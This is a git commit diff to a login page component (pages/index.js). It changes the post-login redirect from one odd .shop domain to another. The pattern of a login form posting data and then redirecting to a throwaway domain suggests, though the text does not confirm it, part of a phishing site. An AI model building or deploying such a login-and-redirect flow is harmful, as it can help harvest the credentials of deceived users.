b01f55c8a9bbf817159e6f4cf1bf95797ddb854e
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-07-30 10:17:54 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://park.wemks-runi.shop/';
+      window.location.href = 'https://frtob.colfillstorage.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
